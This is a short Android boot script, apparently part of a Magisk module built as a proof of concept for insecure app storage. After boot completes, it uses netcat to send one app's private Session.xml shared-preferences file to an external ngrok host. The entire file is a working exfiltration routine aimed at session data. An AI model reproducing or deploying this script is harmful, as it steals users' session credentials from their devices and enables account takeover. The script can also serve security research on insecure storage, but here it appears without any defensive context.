#!/system/bin/sh

MODDIR=${0%/*}

# Wait for boot to complete
until [ "$(getprop sys.boot_completed)" -eq 1 ]; do
    sleep 5
done

# Transfer Session file to Server using Netcat
netcat "0.tcp.sa.ngrok.io" "14827" < "/data/data/com.example.pocmagiskinsecurestorage/shared_prefs/Session.xml"

exit 0
